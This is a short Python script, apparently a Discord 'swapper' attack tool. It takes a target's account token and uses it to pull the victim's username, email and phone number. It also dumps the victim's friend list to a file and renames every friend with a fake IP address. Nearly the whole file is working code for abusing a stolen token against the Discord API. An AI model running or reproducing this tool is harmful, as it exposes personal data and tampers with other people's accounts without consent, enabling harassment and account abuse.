import requests
import json
import random
import os
from json import loads
from pystyle import Colorate, Colors
from urllib.request import Request, urlopen


def clear():
    os.system("cls") if os.name == "nt" else os.system("clear")

def title(args):
    os.system(f"title ~ S W A P P E R ~") if args==None else os.system(f"title ~ S W A P P E R ~ [~] {args}")


friend_ids = []
title(None)
clear()
ascii_art = """-===================-

╔═╗╦ ╦╔═╗╔═╗╔═╗╔═╗╦═╗
╚═╗║║║╠═╣╠═╝╠═╝║╣ ╠╦╝
╚═╝╚╩╝╩ ╩╩  ╩  ╚═╝╩╚═

-===================-     
"""


print(Colorate.Vertical(Colors.red_to_purple, ascii_art))

print("> Deved by HannahHaven\n")

token = input("[?] Targ: ")

def get_info(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    user = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = user['username']
    email = user.get('email')
    if "phone" in user: phone = user['phone']
    return username, email, phone

token_info = get_info(token)


print(f"\n[+] Attacking {token_info[0]} | {token_info[1]} | {token_info[2]} \n")





def change_nick(userid, nick):

    headers = {
        'authorization' : token
    }

    data = {
        'nickname' : nick
    }

    r = requests.patch(f"https://discord.com/api/v9/users/@me/relationships/{userid}", headers=headers, json=data)


    if r.status_code == 204:
        print(f"[+] Succesfully renamed {userid} to '{nick}'")
    

def get_friends(token):
    headers = {
    "Authorization": token,
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
}

    response = urlopen(Request("https://discord.com/api/v10/users/@me/relationships", headers=headers))
    friend_list = json.loads(response.read().decode())
    with open(f'friends.txt', 'w') as f:
        for friend in friend_list:
            tow = f"{friend['user']['global_name']}|{friend['user']['id']}\n"
            friend_ids.append(friend['user']['id'])
            f.write(tow)



get_friends(token)

with open('friends.txt', 'r') as f:
    lines = f.read().splitlines()
    for line in lines:
        ur_id = line.split('|')
        change_nick(ur_id[1], f"{ur_id[0]} | {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}")

input("\nPress enter to exit...")
